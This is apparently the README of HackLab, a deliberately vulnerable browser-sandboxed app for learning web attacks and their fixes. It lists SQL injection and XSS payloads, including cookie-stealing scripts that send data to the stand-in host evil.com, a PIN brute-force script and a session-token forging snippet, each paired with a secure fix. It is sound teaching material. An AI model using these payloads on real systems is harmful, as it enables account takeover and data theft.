<div align="center">

```
██╗  ██╗ █████╗  ██████╗██╗  ██╗██╗      █████╗ ██████╗ 
██║  ██║██╔══██╗██╔════╝██║ ██╔╝██║     ██╔══██╗██╔══██╗
███████║███████║██║     █████╔╝ ██║     ███████║██████╔╝
██╔══██║██╔══██║██║     ██╔═██╗ ██║     ██╔══██║██╔══██╗
██║  ██║██║  ██║╚██████╗██║  ██╗███████╗██║  ██║██████╔╝
╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚═════╝ 
           A C A D E M Y  —  L E A R N · A T T A C K · D E F E N D
```

**A deliberately vulnerable web application for learning ethical hacking.**  
Explore real vulnerabilities, run attacks in a safe browser sandbox, and learn how to fix them

---


[![OWASP](https://img.shields.io/badge/Based%20On-OWASP%20Top%2010-red?style=for-the-badge)](https://owasp.org/Top10/)
[![Ethical Hacking](https://img.shields.io/badge/Purpose-Ethical%20Hacking%20Education-purple?style=for-the-badge)]()

</div>

---

> **⚠️ LEGAL DISCLAIMER**  
> HackLab is built **exclusively for educational purposes**. All attack simulations run entirely in your browser against a simulated environment — no real servers, databases, or users are involved. The techniques demonstrated here are meant to help developers understand and fix vulnerabilities in their own applications. **Never use these techniques against systems you do not own or have explicit written permission to test.**

---

## 📋 Table of Contents

- [Overview](#-overview)
- [Live Demo](#-live-demo)
- [Features](#-features)
- [Vulnerability Labs](#-vulnerability-labs)
  - [SQL Injection](#1--sql-injection-lab)
  - [Cross-Site Scripting (XSS)](#2--cross-site-scripting-xss-lab)
  - [Broken Authentication](#3--broken-authentication-lab)
  - [IDOR](#4--insecure-direct-object-reference-idor-lab)
- [Screenshots](#-screenshots)
- [Getting Started](#-getting-started)
- [Project Structure](#-project-structure)
- [Tech Stack](#-tech-stack)
- [Learning Path](#-learning-path)
- [OWASP Mapping](#-owasp-top-10-mapping)
- [Contributing](#-contributing)
- [License](#-license)

---

## 🎯 Overview

HackLab is a **single-file, zero-dependency, zero-cost** deliberately vulnerable web application (DVA). Unlike traditional platforms such as DVWA or WebGoat that require Docker, PHP, MySQL, or complex server setups, HackLab runs entirely in the browser.

It is designed as both a **learning tool** and an **interactive reference** for:

- Web developers learning about security for the first time
- Security students preparing for certifications (CEH, OSCP, CompTIA Security+)
- Educators who want a portable, zero-setup teaching tool
- CTF players brushing up on web exploitation fundamentals

Every lab follows the same three-part structure:

```
THEORY → ATTACK → DEFEND
  ↓          ↓        ↓
Learn how  Exploit  Learn the
it works   safely   fix
```

---

## 🌐 Live Demo



**Quickstart (local):** Download `index.html` → double-click it → open in any modern browser. Done.

---

## ✨ Features

| Feature | Details |
|---|---|
| 🏗️ **Zero Dependencies** | No npm, no pip, no Docker. One `.html` file. |
| 🧪 **10+ Interactive Challenges** | Each with live simulation, payload library, and scoring |
| 🎓 **Theory + Practice + Fix** | Every vulnerability explained, exploited, and patched |
| 🏆 **Points System** | Gamified scoring that rewards successful exploits |
| 💡 **Hint System** | Progressive hints for each challenge — no spoilers by default |
| 📚 **Payload Libraries** | Pre-built attack payloads for every vulnerability type |
| 🖥️ **Live Query Preview** | Watch SQL queries mutate in real-time as you type |
| 🤖 **Attack Simulators** | Animated brute force, dictionary attack, and blind SQLi automation |
| 📋 **OWASP Checklist** | Full OWASP Top 10 reference with quick-test guide |
| 🛡️ **Fix-It Guide** | Side-by-side vulnerable vs. secure code for every vulnerability |
| 🌑 **Cyberpunk Design** | Fully custom dark terminal aesthetic — built to look like a real hacking tool |

---

## 🔬 Vulnerability Labs

### 1. 💉 SQL Injection Lab

SQL Injection is ranked **#3 in OWASP Top 10** and remains one of the most exploited vulnerabilities in the wild. The lab covers four distinct techniques across increasing difficulty levels.

#### Level 1 — Classic / Auth Bypass `[EASY]`

A login form that concatenates user input directly into a SQL query with no sanitization.

**What you learn:**
- How string concatenation creates injection points
- The `' OR '1'='1` auth bypass technique
- SQL comment injection with `--` to truncate queries
- How to use the live query preview to see your payload's effect in real-time

**Example payloads:**
```sql
-- In the password field:
' OR '1'='1
' OR 1=1--

-- In the username field:
admin'--
' OR 1=1 LIMIT 1--
```

**The vulnerable query:**
```sql
-- What the developer wrote:
SELECT * FROM users WHERE username = '$user' AND password = '$pass'

-- What the attacker sends:
SELECT * FROM users WHERE username = 'admin'-- ' AND password = 'anything'
```

---

#### Level 2 — UNION-Based Attack `[MEDIUM]`

A product search endpoint vulnerable to UNION injection, allowing an attacker to pivot from the `products` table to the `users` table in a single query.

**What you learn:**
- Determining column count with `ORDER BY`
- Constructing UNION payloads that match column count and types
- Dumping entire database tables via a search field
- Enumerating `information_schema` for table names

**Example payloads:**
```sql
-- Step 1: Find column count
laptop' ORDER BY 3--

-- Step 2: Dump users table
x' UNION SELECT username,password_hash,role FROM users--

-- Step 3: Enumerate all tables
x' UNION SELECT table_name,2,3 FROM information_schema.tables--
```

---

#### Level 3 — Blind Boolean SQLi `[HARD]`

A user lookup endpoint that returns only "found" or "not found" — no data is displayed. Attackers extract data one character at a time by asking TRUE/FALSE questions.

**What you learn:**
- The fundamental concept of blind SQL injection
- Using `SUBSTRING()` to extract data character by character
- Boolean condition testing (TRUE → user found, FALSE → not found)
- Time-based SQLi using `SLEEP()` for truly blind scenarios
- How automated tools like sqlmap automate this using binary search

**Example payloads:**
```sql
-- Test for vulnerability:
1 AND 1=1   → User found  (TRUE)
1 AND 1=2   → Not found   (FALSE — app is vulnerable!)

-- Extract username character by character:
1 AND SUBSTRING(username,1,1)='a'   → found? first char is 'a'
1 AND SUBSTRING(username,2,1)='d'   → found? second char is 'd'

-- Check data length:
1 AND LENGTH(username)>3

-- Time-based variant:
1 AND IF(1=1, SLEEP(5), 0)
```

The lab includes an **automated extraction demo** that simulates how sqlmap extracts a full username through repeated boolean queries.

---

#### Level 4 — Error-Based SQLi `[EXPERT]`

A category filter endpoint that reflects raw database errors to the user. Attackers embed query results inside error messages using MySQL's `EXTRACTVALUE()`.

**What you learn:**
- Why displaying raw DB errors is a vulnerability (information disclosure)
- Using `EXTRACTVALUE()` with `CONCAT(0x7e, ...)` to embed data in XPATH errors
- Extracting `version()`, `database()`, and `user()` via error messages

**Example payloads:**
```sql
-- Trigger a basic error to confirm vulnerability:
1'

-- Extract database version from error message:
1 AND EXTRACTVALUE(1,CONCAT(0x7e,version()))
-- Error: XPATH syntax error: '~8.0.32-MySQL Community Server'

-- Extract database name:
1 AND EXTRACTVALUE(1,CONCAT(0x7e,database()))
-- Error: XPATH syntax error: '~hacklab_prod'
```

#### ✅ The Fix

```php
// ❌ VULNERABLE — string concatenation
$query = "SELECT * FROM users WHERE username = '" . $_POST['user'] . "'";

// ✅ FIXED — parameterized query (PHP PDO)
$stmt = $pdo->prepare("SELECT * FROM users WHERE username = ?");
$stmt->execute([$_POST['user']]);

// ✅ FIXED — parameterized query (Python)
cursor.execute("SELECT * FROM users WHERE username = %s", (username,))
```

**Key defenses:** Prepared statements · ORM usage · Input type validation · Least-privilege DB accounts · Never display raw errors

---

### 2. 📜 Cross-Site Scripting (XSS) Lab

XSS affects approximately two-thirds of all web applications. It allows attackers to inject JavaScript that executes in other users' browsers, enabling session theft, account takeover, and credential harvesting.

#### Type 1 — Reflected XSS `[EASY]`

A search bar that reflects user input directly into the HTML response without encoding.

**What you learn:**
- How reflected XSS requires a victim to click a malicious link
- The anatomy of a phishing attack using XSS
- Event handler bypasses for basic `<script>` tag filters
- How `document.cookie` is stolen via XSS

**Example payloads:**
```html
<!-- Basic alert -->
<script>alert('XSS')</script>

<!-- Cookie theft (img onerror bypasses some filters) -->
<img src=x onerror=alert(document.cookie)>

<!-- SVG-based execution -->
<svg onload=alert('XSS')>

<!-- Real attack: redirect victim and steal cookies -->
<script>document.location='https://evil.com/?c='+document.cookie</script>
```

---

#### Type 2 — Stored XSS `[MEDIUM]`

A comment board that saves user input to a "database" and renders it with `innerHTML` — executing scripts for every user who visits the page.

**What you learn:**
- Why stored XSS is far more dangerous than reflected (no social engineering needed per victim)
- How `innerHTML` is a dangerous sink
- The British Airways 2018 card-skimmer attack as a real-world case study
- Session cookie exposure and exfiltration

**Example payloads:**
```html
<!-- Stored in the DB, fires for every visitor: -->
<script>fetch('https://evil.com/?c='+document.cookie)</script>

<!-- Event-based variants that bypass script filters: -->
<img src=x onerror=document.location='https://evil.com/?c='+document.cookie>
```

---

#### Type 3 — DOM-Based XSS `[HARD]`

A page that reads `window.location.hash` and writes it to the DOM using `innerHTML` — pure client-side XSS with no server involvement.

**What you learn:**
- The difference between server-side and DOM-based XSS
- Common dangerous sinks: `innerHTML`, `document.write()`, `eval()`, `location.href`
- Why DOM XSS is harder to detect with server-side scanning tools
- HTML5 event handlers that bypass simple script-tag filters

**Example payloads:**
```html
<!-- The vulnerable code: element.innerHTML = location.hash -->

<img src=x onerror=alert('DOM XSS')>
<iframe src=javascript:alert('XSS')>
<details open ontoggle=alert(1)>
```

#### ✅ The Fix

```javascript
// ❌ VULNERABLE
element.innerHTML = userInput;

// ✅ FIXED — textContent never parses HTML
element.textContent = userInput;

// ✅ FIXED — HTML entity encoding
function escapeHtml(s) {
  return s
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;');
}

// ✅ FIXED — Use DOMPurify for rich HTML input
const clean = DOMPurify.sanitize(userInput);
element.innerHTML = clean;
```

**Key defenses:** `textContent` over `innerHTML` · Output encoding · Content Security Policy (CSP) · DOMPurify · HttpOnly cookies · Modern framework auto-escaping (React, Vue, Angular)

---

### 3. 🔓 Broken Authentication Lab

Authentication failures are **#7 in OWASP Top 10** and the gateway to full account takeover. The lab covers three distinct attack vectors across a progressively complex set of simulations.

#### Attack 1 — Brute Force `[EASY]`

A 4-digit PIN login with no rate limiting, no account lockout, and no CAPTCHA. An attacker can try all 10,000 combinations in seconds.

**What you learn:**
- Why rate limiting is a fundamental security control
- The mathematics of brute force (PIN space vs. time)
- How tools like Hydra and Burp Intruder automate credential testing
- Comparing attack time across different password complexities

**Interactive features:**
- Configurable attack speed (50ms / 200ms / 500ms per attempt)
- Animated progress bar showing real-time attack progress
- Live terminal log of attempts
- Randomized target PIN on each page load — the simulator actually finds it

**Equivalent Python script (for educational reference):**
```python
import requests

for pin in range(10000):
    r = requests.post('https://target/login', {
        'user': 'admin',
        'pin': str(pin).zfill(4)
    })
    if 'Welcome' in r.text:
        print(f"PIN found: {pin:04d}")
        break
# Runs in ~10 seconds against an unprotected endpoint
```

---

#### Attack 2 — Dictionary Attack `[MEDIUM]`

A login endpoint attacked using real-world wordlists. The simulation tries common passwords, a RockYou sample, or a custom user-supplied list against the target account.

**What you learn:**
- Why dictionary attacks are orders of magnitude faster than pure brute force
- The RockYou breach and its lasting impact on password security
- Credential stuffing — using leaked breach data across multiple sites
- Why "password123", "sunshine", and "letmein" are always tried first

**Wordlists included:**
- `common` — Top 20 most-used passwords worldwide
- `rockyou` — 50-word sample from the infamous 14-million-password RockYou breach list
- `custom` — Paste your own wordlist, one password per line

**Password statistics covered:**
> 80% of confirmed data breaches involve weak or stolen passwords (Verizon DBIR 2023)

---

#### Attack 3 — Session Hijacking `[HARD]`

Demonstrates a predictable session token system where tokens are generated as `base64(username + timestamp)`. Attackers decode, forge, and re-encode a token to impersonate the admin.

**What you learn:**
- Why token predictability is as dangerous as a weak password
- The four methods of session hijacking (prediction, XSS theft, network sniffing, fixation)
- Comparing token security: sequential IDs vs. MD5 vs. UUID vs. HMAC-signed JWT
- Session fixation attacks

**The vulnerable token scheme:**
```javascript
// Server generates tokens like this:
const sessionId = btoa(username + ":" + Date.now());
// e.g.: "YWRtaW46MTcxMjM0NTY3ODkwMA==" → "admin:1712345678900"

// An attacker who knows the username can forge a valid token!
const forged = btoa("admin:" + Date.now());
// Send this cookie → gain admin access
```

#### ✅ The Fix

```javascript
// ✅ Rate limiting (Express.js)
const rateLimit = require('express-rate-limit');
app.use('/login', rateLimit({ windowMs: 15 * 60 * 1000, max: 5 }));

// ✅ Cryptographically secure session token
const sessionId = crypto.randomUUID(); // 128-bit random — unguessable

// ✅ Password hashing (never store plaintext or MD5/SHA1)
const hash = await bcrypt.hash(password, 12);

// ✅ Secure cookie flags
res.cookie('session', sessionId, {
  httpOnly: true,   // JS cannot read it — blocks XSS theft
  secure: true,     // HTTPS only
  sameSite: 'Strict' // CSRF protection
});
```

**Key defenses:** Rate limiting · Account lockout · bcrypt/Argon2 hashing · Cryptographic session tokens · MFA · Secure cookie flags · CAPTCHA after failures

---

### 4. 🔑 Insecure Direct Object Reference (IDOR) Lab

IDOR falls under **Broken Access Control (OWASP #1)** — the single most prevalent web application vulnerability category. It occurs when applications use user-supplied input to access objects without verifying authorization.

#### Scenario 1 — Profile Access IDOR `[EASY]`

You're logged in as User #3 (bob). The profile API accepts a `user_id` parameter and returns data for any user without checking ownership.

**What you learn:**
- The simplest and most common form of IDOR (integer ID enumeration)
- What data is at risk: SSNs, credit card numbers, salaries, addresses
- How a single vulnerable API endpoint exposes every user in the database
- Real-world IDOR disclosures (Facebook, Instagram) and their bug bounty payouts

**The attack:**
```
# Legitimate request — your own profile:
GET /api/user/profile?user_id=3  →  {"username": "bob", ...}

# IDOR attack — access admin's profile:
GET /api/user/profile?user_id=1  →  {"username": "admin", "ssn": "123-45-6789", ...}

# IDOR attack — access alice's profile:
GET /api/user/profile?user_id=2  →  {"username": "alice", "credit_card": "4532-XXXX-XXXX-4488", ...}
```

---

#### Scenario 2 — Invoice / File IDOR `[MEDIUM]`

A file download endpoint that serves invoices by ID. Your invoices are INV-301 and INV-302. Changing the ID exposes other customers' financial documents.

**What you learn:**
- IDOR beyond sequential integers: filenames, encoded IDs, UUIDs
- How predictable file naming enables unauthorized document access
- The scope of data exposure: bank details, routing numbers, tax IDs
- How to enumerate a range of IDs to harvest all records

**IDOR variants beyond integers:**
```
# Predictable filename IDOR:
/files/invoice_alice_2024.pdf

# Base64-encoded IDOR (false security):
/api/order/dXNlcjoxMjM=  →  decode  →  "user:123"  →  change  →  re-encode

# UUID IDOR (rare but possible if UUIDs are leaked or guessable):
/api/doc/a1b2c3d4-e5f6-...
```

#### ✅ The Fix

```javascript
// ❌ VULNERABLE — no ownership check
app.get('/api/invoice/:id', auth, (req, res) => {
  const invoice = db.find({ id: req.params.id });
  res.json(invoice); // returns ANY user's invoice!
});

// ✅ FIXED — enforce ownership
app.get('/api/invoice/:id', auth, (req, res) => {
  const invoice = db.find({
    id: req.params.id,
    customer_id: req.session.userId // ← only matches if YOU own it
  });
  if (!invoice) return res.status(403).json({ error: 'Forbidden' });
  res.json(invoice);
});
```

**Key defenses:** Server-side ownership verification · UUID over sequential IDs · Indirect reference maps · Role-based access control (RBAC) · Enumeration alerting

---

## 📸 Screenshots

<img width="1272" height="715" alt="Screen Shot 2026-04-06 at 07 12 17" src="https://github.com/user-attachments/assets/06230c36-8876-4911-8a78-f43ba409a9ce" />


---

## 🚀 Getting Started

### Option 1 — Run Locally (Instant)

No installation, no dependencies.

```bash
# Clone the repository
git clone https://github.com/AshimKoirala/HackLab.git

# Navigate into the directory
cd HackLab

# Open directly in your browser
open index.html        # macOS
start index.html       # Windows
xdg-open index.html   # Linux
```

That's it. The entire application is self-contained.

### Option 2 — Serve with a Local Web Server (Optional)

If you prefer serving it over HTTP rather than the `file://` protocol:

```bash
# Python 3
python3 -m http.server 8080

# Node.js (npx)
npx serve .

# PHP
php -S localhost:8080
```

Then open `http://localhost:8080/index.html` in your browser.

---

## 📁 Project Structure

```
hacklab/
│
├── index.html     # The entire application (single file)
│              
└── README.md                  # This file
```

The entire application — all HTML, CSS, JavaScript, simulated databases, attack logic, and educational content — lives in `index.html`. This is an intentional design decision to make the project as portable and frictionless as possible.

---

## 🛠 Tech Stack

| Layer | Technology | Why |
|---|---|---|
| Structure | HTML5 | Universal, no build step |
| Styling | Pure CSS3 | No framework dependencies |
| Logic | Vanilla JavaScript (ES2020) | Zero dependencies, runs everywhere |
| Fonts | Google Fonts CDN | Share Tech Mono · Orbitron · Exo 2 |
| Hosting | Any static host | GitHub Pages / Netlify / Vercel / Cloudflare |
| Backend | **None** | Entire DB is simulated in JS |
| Build Tool | **None** | Open the HTML file and go |

---

## 📚 Learning Path

HackLab is designed to be worked through progressively. Here is the recommended order:

```
Beginner
   │
   ├── 1. SQL Injection — Level 1 (Classic Login Bypass)
   ├── 2. XSS — Type 1 (Reflected)
   ├── 3. Broken Auth — Attack 1 (Brute Force)
   ├── 4. IDOR — Scenario 1 (Profile Access)
   │
Intermediate
   │
   ├── 5. SQL Injection — Level 2 (UNION Attack)
   ├── 6. XSS — Type 2 (Stored)
   ├── 7. Broken Auth — Attack 2 (Dictionary)
   ├── 8. IDOR — Scenario 2 (Invoice IDOR)
   │
Advanced
   │
   ├── 9. SQL Injection — Level 3 (Blind Boolean)
   ├── 10. XSS — Type 3 (DOM-Based)
   └── 11. Broken Auth — Attack 3 (Session Hijacking)
   │
Expert
   │
   └── 12. SQL Injection — Level 4 (Error-Based)
```

**After completing all labs, you should be able to:**
- Identify and manually test for all four vulnerability types
- Understand the underlying root cause of each vulnerability
- Write basic exploitation payloads from memory
- Implement the correct defenses in real application code
- Use professional tools: Burp Suite, sqlmap, OWASP ZAP

---

## 🗺 OWASP Top 10 Mapping

| # | OWASP Category | Covered In HackLab |
|---|---|---|
| A01 | **Broken Access Control** | IDOR Lab (Scenarios 1 & 2) |
| A02 | Cryptographic Failures | Auth Lab (Session Hijacking, weak tokens) |
| A03 | **Injection** | SQL Injection Lab (all 4 levels) + XSS Lab (all 3 types) |
| A04 | Insecure Design | Fix-It Guide reference |
| A05 | Security Misconfiguration | Error-based SQLi (verbose errors) |
| A06 | Vulnerable & Outdated Components | Fix-It Guide reference |
| A07 | **Identification & Auth Failures** | Broken Auth Lab (all 3 attacks) |
| A08 | Software & Data Integrity Failures | Fix-It Guide reference |
| A09 | Security Logging Failures | Fix-It Guide reference |
| A10 | SSRF | Fix-It Guide reference |

---

## 🔧 Recommended Tools to Practice With

Once you're comfortable with the concepts here, graduate to these professional tools:

**Testing & Scanning**
- [Burp Suite Community Edition](https://portswigger.net/burp/communitydownload) — Industry-standard web proxy for intercepting and modifying requests
- [OWASP ZAP](https://www.zaproxy.org/) — Free, open-source vulnerability scanner
- [sqlmap](https://sqlmap.org/) — Automated SQL injection detection and exploitation
- [Nikto](https://cirt.net/Nikto2) — Web server vulnerability scanner

**Defensive Libraries**
- [DOMPurify](https://github.com/cure53/DOMPurify) — HTML sanitization to prevent XSS
- [helmet.js](https://helmetjs.github.io/) — HTTP security headers for Node.js/Express
- [bcrypt.js](https://github.com/kelektiv/node.bcrypt.js) — Password hashing
- [express-rate-limit](https://github.com/nfriedly/express-rate-limit) — Rate limiting middleware

**Further Practice Platforms**
- [PortSwigger Web Security Academy](https://portswigger.net/web-security) — Free, excellent labs (same team as Burp Suite)
- [HackTheBox](https://www.hackthebox.com/) — CTF challenges and real machines
- [TryHackMe](https://tryhackme.com/) — Guided, beginner-friendly learning paths
- [OWASP WebGoat](https://owasp.org/www-project-webgoat/) — Classic deliberately vulnerable application

---

## 🤝 Contributing

Contributions are welcome! Here are some ways to help:

**Ideas for new labs:**
- [ ] CSRF (Cross-Site Request Forgery)
- [ ] XXE (XML External Entity Injection)
- [ ] SSRF (Server-Side Request Forgery)
- [ ] Command Injection
- [ ] Insecure Deserialization
- [ ] Path Traversal / LFI

**How to contribute:**

```bash
# 1. Fork the repository
# 2. Create a feature branch
git checkout -b feature/csrf-lab

# 3. Make your changes to index.html
# 4. Test thoroughly in Chrome, Firefox, and Safari
# 5. Submit a pull request with a clear description

# Guidelines:
# - All new labs must follow the Theory → Attack → Defend structure
# - New attack simulators must be fully sandboxed (no real network requests)
# - Include a payload library for every new vulnerability
# - Add appropriate scoring for new challenges
# - Update this README with documentation for the new lab
```

**Reporting Issues:**

If you find a bug, have a suggestion, or want to request a new vulnerability type, please [open an issue](../../issues/new) with:
- A clear title and description
- Steps to reproduce (for bugs)
- Your browser and operating system

---

## 📜 License

```
MIT License

Copyright (c) 2024 HackLab Contributors

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
```

---

## 🙏 Acknowledgements

- [OWASP Foundation](https://owasp.org/) — For the Top 10 framework and WebGoat inspiration
- [PortSwigger](https://portswigger.net/web-security) — For their excellent public security research and labs
- [DVWA Project](https://dvwa.co.uk/) — The original deliberately vulnerable web app that inspired this format
- The global security research community for responsibly disclosing and documenting these vulnerability classes

---

<div align="center">

**Built for education. Use responsibly. Hack ethically.**

⭐ If this helped you learn something — star the repo and share it with a fellow developer!

`index.html` · Single file · Zero dependencies

</div>
